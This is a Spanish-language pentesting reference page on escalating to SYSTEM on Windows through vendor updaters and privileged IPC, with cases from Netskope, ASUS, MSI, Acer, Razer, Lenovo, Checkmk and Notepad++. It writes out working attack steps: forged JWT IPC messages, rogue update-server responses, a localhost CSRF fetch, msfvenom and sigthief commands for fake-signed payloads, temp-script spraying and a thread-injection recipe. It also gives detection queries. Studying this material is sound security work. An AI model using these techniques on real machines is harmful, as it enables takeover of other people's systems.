# Abusing Enterprise Auto-Updaters y Privileged IPC (p. ej., Netskope, ASUS y MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de local privilege escalation en Windows encontradas en agentes de endpoint empresariales y updaters que exponen una superficie IPC de fácil acceso y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client para Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el enrollment contra un servidor controlado por el atacante y, después, entregar un MSI malicioso que el servicio SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar el re-enrollment o la reconfiguración hacia un servidor del atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA fraudulenta y apuntar el updater hacia un paquete malicioso “firmado”.
- Evadir comprobaciones débiles del signer (allow-lists basadas en CN), flags de digest opcionales y propiedades laxas de MSI.
- Si el IPC está “encrypted”, derivar la key/IV a partir de identificadores de máquina legibles por todos almacenados en el registry.
- Si el servicio restringe los callers mediante la ruta de la imagen o el nombre del proceso, inyectarse en un proceso incluido en la allow-list o iniciar uno suspendido y cargar la DLL mediante un parche mínimo del contexto del thread.

---
## 1) Forzar el enrollment contra un servidor del atacante mediante localhost IPC

Muchos agentes incluyen un proceso de UI en user-mode que se comunica con un servicio SYSTEM a través de TCP localhost usando JSON.

Observado en Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Crear un token JWT de enrollment cuyos claims controlen el host del backend (p. ej., AddonUrl). Usar alg=None para que no se requiera una firma.
2) Enviar el mensaje IPC que invoque el comando de provisioning con el JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio comienza a comunicarse con tu servidor rogue para el enrollment/config, p. ej.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del caller se basa en la ruta o el nombre, origina la solicitud desde un binario del vendor incluido en la allow-list (consulta §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking del canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente se comunique con tu servidor, implementa los endpoints esperados y dirígelo hacia un MSI controlado por el atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo del updater muy corto, p. ej.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA en formato PEM. El servicio lo instala en el almacén Local Machine Trusted Root.
3) /v2/checkupdate → Proporciona metadata que apunta a un MSI malicioso y a una versión falsa.

Evadir comprobaciones comunes observadas en la práctica:
- Allow-list del CN del firmante: el servicio puede comprobar únicamente que el Subject CN sea igual a “netSkope Inc” o “Netskope, Inc.”. Tu rogue CA puede emitir un leaf con ese CN y firmar el MSI.
- Propiedad CERT_DIGEST: incluye una propiedad de MSI benigna llamada CERT_DIGEST. No se aplica ninguna validación durante la instalación.
- Aplicación opcional del digest: un flag de configuración (por ejemplo, check_msi_digest=false) desactiva la validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lección sobre el bypass de parches: si un vendor responde permitiendo únicamente una pequeña lista de dominios “trusted” en lugar de autenticar criptográficamente la fuente de la actualización, busca redirectors o reverse proxies propiedad del vendor que todavía permitan dirigir el tráfico. En el caso de Netskope, investigaciones públicas posteriores mostraron que una allow-list de la era R129 todavía podía abusarse mediante `rproxy.goskope.com`, que hacía proxy del contenido controlado por el atacante alojado en Azure App Service. Trata las allow-lists de hostnames como un obstáculo menor, no como un límite de confianza.<sup>[[14]](#references)</sup>

---
## 3) Forjar solicitudes IPC cifradas (cuando estén presentes)

A partir de R127, Netskope envolvía el JSON de IPC en un campo encryptData que parece Base64. El reversing mostró que utiliza AES con una key/IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar.<sup>[[1]](#references)[[2]](#references)</sup> Consejo general: si un agent de repente “cifra” su IPC, busca device IDs, product GUIDs e install IDs bajo HKLM como material.

---
## 4) Evadir allow-lists de callers de IPC (comprobaciones de ruta/nombre)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen con vendor binaries incluidos en una allow-list y ubicados bajo Program Files (por ejemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypasses prácticos:
- DLL injection en un proceso incluido en la allow-list (por ejemplo, nsdiag.exe) y hacer proxy del IPC desde su interior.
- Iniciar un binary incluido en la allow-list en estado suspended y bootstrappear tu proxy DLL sin CreateRemoteThread (consulta §5) para satisfacer las reglas de tamper aplicadas por el driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatible con la tamper-protection: proceso suspended + patch de NtContinue

Los productos suelen incluir un driver minifilter/OB callbacks (por ejemplo, Stadrv) para eliminar derechos peligrosos de los handles a procesos protegidos:
- Process: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode fiable que respeta estas restricciones:
1) Ejecuta CreateProcess de un vendor binary con CREATE_SUSPENDED.
2) Obtén los handles que todavía están permitidos: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sobre el proceso, y un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si haces patch del código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano y mapeado con garantía) con un stub pequeño que llame a LoadLibraryW usando la ruta de tu DLL y después salte de vuelta.
4) Ejecuta ResumeThread para activar tu stub dentro del proceso y cargar tu DLL.

Como nunca utilizaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sobre un proceso que ya estuviera protegido (tú lo creaste), la política del driver se cumple.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Tooling práctico
- NachoVPN (plugin de Netskope) automatiza una rogue CA, la firma de un MSI malicioso y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope es un cliente IPC personalizado que construye mensajes IPC arbitrarios (opcionalmente cifrados con AES) e incluye la injection de procesos suspended para originar la comunicación desde un binary incluido en la allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rápido de triage para superficies de updater/IPC desconocidas

Al enfrentarte a un endpoint agent nuevo o a una suite de “helpers” de la placa base, normalmente un workflow rápido basta para determinar si estás ante un objetivo prometedor de privesc:<sup>[[6]](#references)</sup>

1) Enumera los listeners de loopback y relaciónalos con los procesos del vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerar named pipes candidatos:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraer datos de enrutamiento respaldados por el registro usados por servidores IPC basados en plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrae primero los nombres de los endpoints, las claves JSON y los ID de los comandos desde el cliente en user-mode. Los frontends de Electron/.NET empaquetados suelen filtrar el esquema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Busca el trust predicate real, no solo la ruta de código que finalmente inicia el proceso:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrones que conviene priorizar:
- `CryptQueryObject`/análisis de certificados sin `WinVerifyTrust` normalmente significa que se trató “existe un certificado” como “el certificado es de confianza”, lo que permite la clonación de certificados u otros trucos de fake-signer.
- Las comprobaciones de substring/sufijo sobre `Origin`, `Referer`, URLs de descarga, nombres de procesos o CN de firmantes no son autenticación. `contains(".vendor.com")` normalmente es explotable mediante dominios similares controlados por el atacante.
- Si la GUI con pocos privilegios decide que “el archivo es de confianza” y el broker SYSTEM simplemente consume ese resultado, parchear o reimplementar la DLL/JS del lado del cliente suele omitir por completo el límite (separación de validación al estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y después lo valida o programa desde esa ruta, prueba inmediatamente las ventanas de reemplazo TOCTOU y los módulos de plugins hermanos que exponen wrappers alternativos de `ExecuteTask()` con comprobaciones más débiles.<sup>[[6]](#references)</sup>

Para objetivos con muchas named pipes, PipeViewer es una forma rápida de detectar DACLs débiles y pipes accesibles remotamente antes de empezar a hacer reversing del protocolo en profundidad.<sup>[[11]](#references)</sup>

Si el objetivo autentica a los callers únicamente mediante PID, ruta de la imagen o nombre del proceso, considérelo un obstáculo menor y no un límite: inyectarse en el cliente legítimo o realizar la conexión desde un proceso incluido en la allow-list a menudo es suficiente para satisfacer las comprobaciones del servidor. Específicamente para named pipes, [esta página sobre client impersonation y pipe abuse](named-pipe-client-impersonation.md) cubre el primitive con más profundidad.

---
## 8) Brokers de add-ins modulares autenticados únicamente mediante firmas del vendor (patrón Lenovo Vantage)

Una variación más reciente que conviene buscar es el **signed-client RPC broker**: un proceso de escritorio Lenovo-signed con pocos privilegios se comunica con un servicio SYSTEM, y el servicio dirige comandos JSON a un conjunto de add-ins descritos mediante XML en `%ProgramData%`. Una vez que se logra la ejecución de código **dentro de cualquier signed client aceptado**, cada contrato `runas="system"` pasa a formar parte de tu attack surface.<sup>[[15]](#references)</sup>

Primitives de alto valor observados en la investigación de Lenovo Vantage:
- **Confiar en el caller porque está firmado por el vendor**: los investigadores alcanzaron un contexto autenticado copiando un EXE firmado por Lenovo a un directorio escribible y satisfaciendo un DLL side-load (`profapi.dll`), de modo que se ejecutara código arbitrario dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de la attack surface mediante manifests**: los add-ins se declaran en `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, por lo que enumerar esos manifests suele revelar los verbs privilegiados reales más rápido que hacer reversing del broker.
- **Bugs por comando detrás del canal autenticado**: una vez dentro del cliente de confianza, la investigación pública encontró path traversal + race conditions en verbs de update/install, abuso de raw SQL en bases de datos privilegiadas de settings y comprobaciones de rutas del registro basadas en substrings que permitían escribir fuera de la hive prevista.

Recon útil en un objetivo:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Conclusión práctica: siempre que un conjunto de helpers exponga un broker que autentique primero el **proceso caller** y solo después distribuya las solicitudes entre docenas de comandos de plugins/add-ins, no te detengas después de eludir la comprobación de confianza inicial. Extrae la tabla de manifest/contratos y fuzz cada verbo de alto privilegio de forma independiente; el canal autenticado suele ocultar varios bugs de segunda etapa.

---
## 1) CSRF de browser a localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del browser procedentes de https://driverhub.asus.com. El filtro de origin simplemente ejecuta `string_contains(".asus.com")` sobre el header Origin y sobre las URLs de descarga expuestas por `/asus/v1.0/*`. Por lo tanto, cualquier host controlado por un atacante, como `https://driverhub.asus.com.attacker.tld`, supera la comprobación y puede emitir requests que cambian el estado mediante JavaScript.<sup>[[6]](#references)</sup> Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para conocer patrones de bypass adicionales.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y aloja allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (por ejemplo, `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el body JSON esperado por el handler; el JS empaquetado del frontend muestra el schema a continuación.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso la CLI de PowerShell mostrada a continuación funciona correctamente cuando el header Origin se falsifica con el valor de confianza:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Por lo tanto, cualquier visita del navegador al sitio del atacante se convierte en un CSRF local de 1 clic (o de 0 clic mediante `onload`) que controla un helper SYSTEM.

---
## 2) Verificación insegura de code-signing y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los almacena en caché en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica basada en subcadenas, por lo que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptada. Después de la descarga, ADU.exe solo comprueba que el PE contenga una firma y que el string Subject coincida con ASUS antes de ejecutarlo; no usa `WinVerifyTrust` ni valida la cadena.

Para weaponizar el flujo:
1) Crea un payload (por ejemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona el signer de ASUS en él (por ejemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Aloja `pwn.exe` en un dominio similar a `.asus.com` y activa UpdateApp mediante el CSRF del navegador anterior.

Como tanto los filtros de Origin como los de URL se basan en subcadenas y la comprobación del signer solo compara strings, DriverHub descarga y ejecuta el binario del atacante con su contexto elevado.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU dentro de las rutas de copia/ejecución del updater (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP en el que cada frame tiene el formato `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el ejecutable proporcionado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma mediante `CS_CommonAPI.EX_CA::Verify` (el subject del certificado debe ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una scheduled task que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no se bloquea entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar el Frame A apuntando a un binario legítimo firmado por MSI (garantiza que la comprobación de firma pase y que la task se ponga en cola).
- Competir con él mediante mensajes Frame B repetidos que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando se activa el scheduler, ejecuta el payload sobrescrito como SYSTEM, aunque se haya validado el archivo original. Una explotación fiable utiliza dos goroutines/threads que envían repetidamente CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP de MSI Center
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado en `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, lo que permite a los atacantes dirigir comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` sin ninguna validación de firma; cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución como SYSTEM de forma determinista.
- Sniffear el loopback con Wireshark o instrumentar los binarios .NET en dnSpy revela rápidamente el mapeo entre Component y command; después, clientes personalizados en Go/Python pueden reproducir los frames.<sup>[[6]](#references)</sup>

### Named pipes de Acer Control Centre y niveles de impersonation
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (por ejemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el command ID `7` con una ruta de archivo invoca la rutina de creación de procesos del servicio.
- La librería cliente serializa un byte terminador mágico (113) junto con los argumentos. La instrumentación dinámica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para obtener consejos de instrumentación) muestra que el handler nativo asigna este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un SID de integridad antes de llamar a `CreateProcessAsUser`.
- Cambiar 113 (`0x71`) por 114 (`0x72`) lleva a la rama genérica, que conserva el token SYSTEM completo y establece un SID de alta integridad (`S-1-16-12288`). Por lo tanto, el binario creado se ejecuta como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combina esto con el flag del installer expuesto (`Setup.exe -nocheck`) para poner en marcha ACC incluso en lab VMs y probar el pipe sin hardware del vendor.<sup>[[6]](#references)</sup>

Estos bugs de IPC destacan por qué los servicios de localhost deben aplicar autenticación mutua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, filtrado de tokens) y por qué el helper de cada módulo para “ejecutar un binario arbitrario” debe compartir las mismas verificaciones del signer.

---
## 3) Helpers “elevator” de COM/IPC respaldados por una validación débil en user-mode (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario con pocos privilegios puede pedir a un helper COM que lance un proceso mediante `RzUtility.Elevator`, mientras que la decisión de confianza se delega en una DLL user-mode (`simple_service.dll`) en lugar de aplicarse de forma robusta dentro del límite privilegiado.

Ruta de explotación observada:
- Instancia el objeto COM `RzUtility.Elevator`.
- Llama a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un launch elevado.
- En el PoC público, el gate de firma PE dentro de `simple_service.dll` se parchea antes de emitir la solicitud, lo que permite lanzar un ejecutable arbitrario elegido por el atacante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocación mínima de PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Conclusión general: al hacer reversing de suites de “helper”, no te limites a TCP en localhost o named pipes. Comprueba si existen clases COM con nombres como `Elevator`, `Launcher`, `Updater` o `Utility`, y verifica si el servicio privilegiado valida realmente el binario objetivo o si simplemente confía en un resultado calculado por una DLL cliente en user-mode que se puede modificar. Este patrón se generaliza más allá de Razer: cualquier diseño dividido en el que el broker con altos privilegios consuma una decisión de allow/deny del lado con bajos privilegios es un posible privesc surface.


---
## Ejecución predecible de scripts temporales durante la reparación de MSI (Checkmk Agent / CVE-2024-0670)

Algunos agentes de Windows todavía implementan acciones privilegiadas escribiendo un `.cmd` temporal en `C:\Windows\Temp` y ejecutándolo como `SYSTEM`. Si el nombre de archivo es predecible y el servicio no recrea de forma segura los archivos existentes, un usuario con bajos privilegios puede crear previamente el futuro archivo temporal como **read-only** y hacer que el proceso privilegiado ejecute contenido controlado por el atacante en lugar de su propio script.

Observado en builds vulnerables de Checkmk Agent:
- patrón temporal: `cmk_all_<PID>_1.cmd`
- ramas afectadas: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **repair** de MSI del paquete de agente almacenado en caché<sup>[[8]](#references)[[9]](#references)</sup>

Flujo de trabajo práctico:
1. Estima un rango de PID realista a partir de los IDs de proceso actuales o del PID del agente en ejecución.
2. Escribe un payload `.cmd` corto en **ASCII** (`Set-Content -Encoding Ascii` o redirección de `cmd.exe`; evita la salida de PowerShell en UTF-16 para archivos batch).
3. Haz spray de `C:\Windows\Temp\cmk_all_<PID>_1.cmd` en todo el rango candidato y marca cada archivo como read-only.
4. Activa una reparación del MSI almacenado en caché para que el servicio privilegiado intente regenerar y después ejecute el script temporal.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Si el producto vulnerable está instalado con Windows Installer, relaciona el MSI almacenado en caché con aspecto aleatorio en `C:\Windows\Installer` con el nombre de su producto antes de activar la reparación:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Notas operativas:
- `qwinsta` es útil cuando `msiexec /fa` falla desde una shell WinRM no interactiva y necesitas determinar si una sesión de escritorio existente/desconectada puede activar la reparación correctamente.<sup>[[7]](#references)</sup>
- Este patrón se generaliza a otros agentes de endpoint y updaters que **preparan scripts temporales en ubicaciones con permisos de escritura para todos y posteriormente los ejecutan como SYSTEM**. Comprueba la existencia de nombres predecibles, la ausencia de semántica de creación exclusiva y los flujos de reparación/actualización que puedan activarse bajo demanda.

---
## Hijacking remoto de la supply chain mediante validación débil del updater (WinGUp / Notepad++)

Entre junio de 2025 y diciembre de 2025, atacantes que comprometieron la infraestructura de hosting detrás del flujo de actualización de Notepad++ sirvieron selectivamente manifests maliciosos a víctimas elegidas. Los updaters antiguos basados en WinGUp no verificaban completamente la autenticidad de las actualizaciones, por lo que una respuesta XML hostil podía redirigir a los clientes hacia URLs controladas por el atacante. Como el cliente aceptaba contenido HTTPS sin exigir simultáneamente una cadena de certificados confiable y una firma PE válida en el installer descargado, las víctimas descargaban y ejecutaban un `update.exe` de NSIS troyanizado.<sup>[[12]](#references)[[13]](#references)</sup>

Flujo operativo (no requiere exploit local):
1. **Intercepción de la infraestructura**: comprometer la CDN/hosting y responder a las comprobaciones de actualización con metadata del atacante que apunte a una URL de descarga maliciosa.
2. **NSIS troyanizado**: el installer descarga/ejecuta un payload y abusa de dos cadenas de ejecución:
- **Bring-your-own signed binary + sideload**: incluir el `BluetoothService.exe` firmado de Bitdefender y colocar una `log.dll` maliciosa en su search path. Cuando se ejecuta el binario firmado, Windows hace sideload de `log.dll`, que descifra y carga reflectivamente el backdoor Chrysalis (protegido por Warbird + API hashing para dificultar la detección estática).
- **Inyección de shellcode mediante script**: NSIS ejecuta un script Lua compilado que utiliza APIs de Win32 (por ejemplo, `EnumWindowStationsW`) para inyectar shellcode y preparar Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Conclusiones de hardening/detección para cualquier auto-updater:
- Aplicar la **verificación de certificados + firmas** del installer descargado (fijar el signer del vendor, rechazar CN/cadenas que no coincidan) y firmar también el update manifest (por ejemplo, XMLDSig). Bloquear las redirecciones controladas por el manifest salvo que estén validadas.
- Tratar el **sideloading de binarios firmados BYO** como un pivot de detección posterior a la descarga: generar una alerta cuando un EXE firmado de un vendor cargue un nombre de DLL desde fuera de su ruta de instalación canónica (por ejemplo, Bitdefender cargando `log.dll` desde Temp/Downloads) y cuando un updater deje/ejecute installers desde una ubicación temporal con firmas que no sean del vendor.
- Monitorizar los **artefactos específicos del malware** observados en esta cadena (útiles como pivots genéricos): mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` en `%TEMP%` y fases de inyección de shellcode dirigidas por Lua.
- Notepad++ respondió reforzando WinGUp en v8.8.9 y posteriores: el XML devuelto ahora está firmado (XMLDSig), y las versiones más recientes aplican la verificación de certificados + firmas del installer descargado en lugar de confiar únicamente en el transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading de EXE firmado por Bitdefender mediante <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando un instalador que no pertenece a Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Estos patrones se generalizan a cualquier updater que acepte manifests sin firmar o no fije los firmantes del installer: hijacking de red + installer malicioso + sideloading firmado por el atacante permite la ejecución remota de código bajo la apariencia de actualizaciones “de confianza”.

---
## Referencias
- [1] [Advisory – Netskope Client for Windows – Escalada local de privilegios mediante un servidor rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalada local de privilegios mediante archivos modificables en Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalada de privilegios en el agente de Windows](https://checkmk.com/werk/16361)
- [10] [PoCs de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Actores estatales explotan la supply chain de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – actualización del incidente de infraestructura hijacked](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Descubriendo bugs de escalada de privilegios en Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
